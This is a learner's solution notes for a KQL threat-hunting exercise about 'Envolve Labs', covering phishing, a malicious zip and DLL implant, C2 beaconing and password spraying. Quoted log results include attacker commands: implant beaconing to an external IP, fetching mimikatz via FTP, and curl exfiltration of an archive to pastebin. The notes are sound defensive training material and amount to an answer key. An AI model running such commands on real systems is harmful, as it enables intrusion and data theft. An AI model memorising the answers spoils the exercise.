@@ -1,0 +1,491 @@
+﻿Envolve Labs: With a twist!
+10
+PTS
+Section 1 - KQL 101
+▸
+Question 1
+
+my use of AI as support to acceleration investigation
+1- use AI effectively
+2- write good Prompts
+3- know and correct when AI is wrong
+4- verify outputs on my query and AI
+5- Create 
+
+search *
+| distinct $table
+
+Employees
+OutboundBrowsing
+InboundBrowsing
+FileCreationEvents
+Email
+ProcessEvents
+AuthenticationEvents
+PassiveDns
+
+AuthenticationEvents
+| take 10
+
+1.2 How many employees are in the company?
+
+Employees
+| count //1001
+
+1.3 Which employee has the IP address: 192.168.0.191?
+
+Employees
+| where ip_addr =="192.168.0.191"
+
+4/9/2017, 3:54:12.458191 PM	Mary Cook	Mozilla/5.0 (Windows 98; Win 9x 4.90) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/30.0.877.0 Safari/534.2	192.168.0.191	mary_cook@envolvelabs.com	envolvelabs.com	macook	Lab Technician	ZW3N-MACHINE
+
+1.4 How many emails did Laura Parrish receive?
+
+let A=
+Employees
+| where name contains "Laura Parrish"
+| distinct email_addr;
+Email
+| where recipient has_any (A)
+| count //9
+
+1.5 How many Envolve Labs employees received emails with the term vaccine in the subject?
+
+let A=
+Email
+| where subject contains "vaccine"
+| distinct recipient;
+Employees
+| where email_addr has_any (A)
+| count //676
+
+1.6 How many distinct urls did Keith Floyd visit?
+
+let A=
+Employees
+|where name  contains "Keith Floyd"
+| project ip_addr;
+OutboundBrowsing
+| where src_ip has_any (A)
+| distinct url //6
+
+1.7 How many domains in the PassiveDns records contain the word vaccine?
+
+PassiveDns
+| where domain contains "vaccine"
+| distinct domain //7
+
+1.8 What IP did the domain vaccine.net resolve to?
+
+PassiveDns
+| where domain contains "vaccine.net"
+
+58.235.85.30
+
+1.9 How many unique URLs were browsed by employees named Karen?
+
+let A=
+Employees
+|where name  contains "Karen"
+| project ip_addr;
+OutboundBrowsing
+| where src_ip has_any (A)
+| distinct url //43
+
+/////////////////////////Section 2 - Clustering and attribution
+
+2.1 Which user has the file named ResearchBibliographyGenerator.zip on their machine?
+
+let A=
+FileCreationEvents
+| where filename contains "ResearchBibliographyGenerator.zip"
+| project hostname;
+Employees
+| where hostname has_any (A)
+| project name
+
+Terry Simpson
+1/7/2022, 1:24:12.328613 PM	DLY5-DESKTOP	ecb80603030ebfa855276532926963bdebc8fbb2b95a9af52924e3a73e30e88	C:\Users\tesimpson\Downloads\ResearchBibliographyGenerator.zip	ResearchBibliographyGenerator.zip	1,468
+
+
+2.2 When did this user download ResearchBibliographyGenerator.zip?
+
+FileCreationEvents
+| where filename contains "ResearchBibliographyGenerator.zip"
+
+2022-01-07T13:24:12.3286130Z
+
+2.3 What domain did the user download the file from?
+
+OutboundBrowsing
+| where url contains "ResearchBibliographyGenerator.zip"
+| extend domain = tostring(parse_url(url).Host)
+| distinct domain
+/////disarm-remarkable.science
+
+
+2.4 This file may have been downloaded from email.
+
+What was the subject of the email that delivered the file?
+
+Email
+| where link contains "ResearchBibliographyGenerator.zip"
+
+1/7/2022, 1:21:39.328613 PM	john-n-johnmoderno@yahoo.com	vaccinejournal@yahoo.com	terry_simpson@envolvelabs.com	Research opportunties! Apply today	true	http://disarm-remarkable.science/modules/online/search/modules/share/online/ResearchBibliographyGenerator.zip
+
+subject 
+///Research opportunties! Apply today
+
+2.5 Who was the email sent by?
+
+//john-n-johnmoderno@yahoo.com
+
+
+2.5 What other domain was seen in the links?
+
+Email
+| where subject  contains "Research opportunties! Apply today"
+
+///deprived.tech
+
+2.7 What was the interview-themed subject line sent by the threat actor's email address?
+
+Email
+| where sender contains "john-n-johnmoderno@yahoo.com" or reply_to contains "john-n-johnmoderno@yahoo.com"
+| distinct subject
+///Interview Request - Recent research article
+
+
+2.8 Which FDA-themed email address sent an email with that subject line?
+
+
+Email
+| where subject  contains "Interview Request - Recent research article"
+| where sender contains "fda"
+| distinct sender
+
+////pfizar.fda@hotmail.com
+
+2.9 What other .science domain is closely associated with this cluster of activity?
+
+
+PassiveDns
+| where domain contains ".science" and domain contains "vaccine"
+
+
+181.190.66.175	biotech.science
+178.84.205.199	disarm-remarkable.science
+105.249.223.205	biotech.science
+178.84.205.199	disarm-remarkable.science
+181.190.66.175	biotech.science
+109.12.172.244	disarm-remarkable.science
+61.171.203.53	marblesascertained.science
+109.12.172.244	vaccine.science
+70.21.202.99	virus.science
+79.138.211.65	vaccinebissau.science
+218.169.108.251	marblesvirus.science
+215.35.117.146	deprived-virus.science
+
+///vaccine.science 
+// IP 109.12.172.244
+
+2.10
+
+Once the employee downloaded the zip file, things moved fast. Shortly after it landed on the machine, a suspicious DLL appeared.
+
+Which .dll file was created on the victim's machine shortly after ResearchBibliographyGenerator.zip was downloaded?
+
+
+FileCreationEvents
+| where filename contains "ResearchBibliographyGenerator.zip"
+| project timestamp
+
+2022-01-07T13:24:12.3286130Z
+
+FileCreationEvents
+| where timestamp >= datetime(2022-01-07T13:24:12.3286130Z)
+
+DLY5-DESKTOP
+C:\ProgramData\Microsoft\Applications\updater.dll
+///updater.dll   //// 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
+
+2.11
+
+What file name is this DLL listed under on VirusTotal?
+
+the SHA 256  1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
+
+https://www.virustotal.com/gui/file/1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81
+
+/// S4ZD8JVW.dat
+
+
+2.12
+
+After the implant loaded, the attacker started poking around. They ran a common reconnaissance command to learn more about the compromised machine.
+
+Which six-letter reconnaissance command was executed on that user's machine?
+we know the compromised hostnale is DLY5-DESKTOP
+
+ProcessEvents
+| where hostname contains "DLY5-DESKTOP"
+| where process_commandline !contains @"C:\"
+
+whoami
+updater.dll -p 199.57.49.250:8888
+ipconfigg
+ipconfig /all
+echo GET mimikatz.exe >> ftp.txt
+curl F:\exfil\full.gz https://pastebin.com/mZ38bYLt:/NotCompanySecrets.gz
+
+/// whoami
+
+2.13
+
+The implant needs to phone home. After loading, the DLL established a connection to an external server for command and control.
+
+What IP address does the DLL beacon to?
+
+search dll and ip 
+
+ProcessEvents
+| where hostname contains "DLY5-DESKTOP"
+| where process_commandline !contains @"C:\" and process_commandline contains "dll"
+
+2022-01-07T14:37:35.3286130Z
+updater.dll -p 199.57.49.250:8888
+
+//199.57.49.250
+
+using a legitimate cloud service to exfiltrate files, a technique that makes the traffic harder to spot since it looks like normal usage.
+
+What is the domain name of the legitimate service the adversary used to exfiltrate data?
+
+ProcessEvents
+| where hostname contains "DLY5-DESKTOP"
+| where process_commandline contains "exfil"
+
+curl F:\exfil\full.gz https://pastebin.com/mZ38bYLt:/NotCompanySecrets.gz
+
+curl is often use for exfiltration data
+
+//pastebin.com
+
+/////////////////Section 3 - Phishing and more///////////////
+
+3.1
+
+A new lead just came in. Someone reported a phishing email from the sender gaara@qq.com. You pull up the emails and notice the links inside look suspicious.
+
+How many domains were observed in the links from these emails?
+
+Email
+| where sender contains "gaara@qq.com"
+| distinct link
+
+bonded.inf
+activists.tk
+bondedpredicted.org
+clan.io
+
+3.2
+
+Which one of these domains was used the least?
+
+Email
+| where sender contains "gaara@qq.com"
+| summarize SenderCount = dcount(recipient) by link
+
+https://bonded.info/online/files/online/files/auth	5
+activists.tk/files/published/images/share/share/sign_in	3
+https://bondedpredicted.org/share/published/public/share/share/sign_in	5
+https://clan.io/public/search/files/enter	2
+
+//clan.io
+
+3.3
+
+What was the subject line of the emails containing the domain clan.io?
+
+Email
+| where link contains "clan.io"
+| distinct subject
+
+//50% discount on Naruto anime this weekend
+
+
+3.4
+What is the name of the user who clicked on the clan.io link?
+
+
+Email
+| where link contains "clan.io"
+| distinct  recipient
+
+verna_fleeger@envolvelabs.com
+erica_wilson@envolvelabs.com
+
+
+let A=
+OutboundBrowsing
+| where url contains "clan.io"
+| project src_ip;
+Employees
+| where ip_addr has_any (A)
+
+1/28/2014, 5:10:48.638058 PM	Erica Wilson	Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/52.0.807.0 Safari/533.2	192.168.1.219	erica_wilson@envolvelabs.com	envolvelabs.com	erwilson	Finance associate	MSFR-LAPTOP
+
+////Erica Wilson
+192.168.1.219	erica_wilson@envolvelabs.com
+erwilson
+
+3.5
+
+Section 3 - Phishing and more
+▸
+Question 5
+What actor IP was used to compromise the account of this user?
+
+AuthenticationEvents
+| where username  contains "erwilson"
+| where result contains "successful"
+
+223.80.243.56 is not the IP of erica which is 192.168.1.219
+
+//223.80.243.56
+
+3.6
+
+How many accounts did the actor compromise using the IP identified earlier?
+
+AuthenticationEvents
+| where src_ip =="223.80.243.56"
+| where result contains "successful"
+| distinct username
+
+cadornier
+sacombs
+damartin
+maferris
+blwelsh
+jotalley
+erwilson
+mapatterson
+
+//8
+
+3.7
+
+What .info domain shared IPs with domain clan.io?
+
+let clan_ips =
+    PassiveDns
+    | where domain has "clan.io"
+    | distinct ip;
+PassiveDns
+| where domain endswith ".info"
+| join kind=inner clan_ips on ip
+| project domain, ip
+| distinct domain, ip
+
+arbiters-tail.info	223.80.243.56
+
+///arbiters-tail.info
+
+3.8
+
+Which password (hash) was used in failed login attempts against 40 unique accounts?
+
+identify password spraying (many accounts using the same password), use the actual password field name and optionally count distinct users
+
+
+AuthenticationEvents
+| where result contains "fail"
+| summarize Attempts=count(), Users=dcount( username) by password_hash
+| order by Users desc
+
+1a594fcb-ac60-6f03-bea6-39dd3fdba026	44	40
+
+3.9
+
+The login activity exhibited by the user agent above is an example of this attack (2 words)?
+
+ password spray
+
+ 3.10
+
+ We can pivot off of the IPs we can find by looking at the PassiveDNS results associated with the domain swindled.bio.
+
+One of these IP addresses had inbound network requests to our network and was searching specific terms as seen in their web requests.
+
+Looking at their web requests, what terms are they looking for on the company website?
+
+let A=
+PassiveDns
+| where domain contains "swindled.bio"
+| distinct  ip;
+InboundBrowsing
+| where src_ip has_any (A)
+| distinct url
+
+
+https://envolvelabs.com/search?query=research%20priorities
+
+//research%20priorities
+
+3.11
+
+
+One of those login attempts hit its mark.
+
+An employee was targeted at 21:52 on January 7th, 2022 from the IP you identified earlier. But this wasn't the attacker's first interaction with this user.
+
+They had already laid the groundwork with a phishing email.
+
+Which threat actor domain was used to initially target this user via phishing?
+
+AuthenticationEvents
+| where timestamp  >=  datetime(2022-01-07T21:52)
+| where src_ip =="223.80.243.56"
+
+jequerta  failed login
+
+check authentification with this actor
+
+AuthenticationEvents
+| where username contains "jequerta"
+| where src_ip =="223.80.243.56"
+
+
+only one interaction
+
+check Email  username = jequerta
+
+Email
+| where recipient contains "querta"
+| where subject contains "50% discount on Naruto anime this weekend"
+
+1/7/2022, 1:14:25.189838 PM	gaara@qq.com	gaara@qq.com	jessie_querta@envolvelabs.com	50% discount on Naruto anime this weekend	true	
+
+activists.tk/files/published/images/share/share/sign_in
+
+///activists.tk
+
+3.12
+
+The attacker used that domain to go after someone specific. They weren't casting a wide net this time, they had a target in mind, and it was someone in IT.
+
+Who was the IT associate targeted using the domain from the previous question?
+
+let A=
+Email
+| where link  contains "activists.tk"
+| distinct recipient;
+Employees
+| where email_addr has_any (A)
+| where role contains "IT"
+
+8/31/2017, 4:07:06.598549 PM	Blake Welsh	Mozilla/5.0 (Linux; Android 2.2.2) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/61.0.851.0 Safari/533.2	192.168.0.227	blake_welsh@envolvelabs.com	envolvelabs.com	blwelsh	IT associate	LOGH-DESKTOP
+
+
+
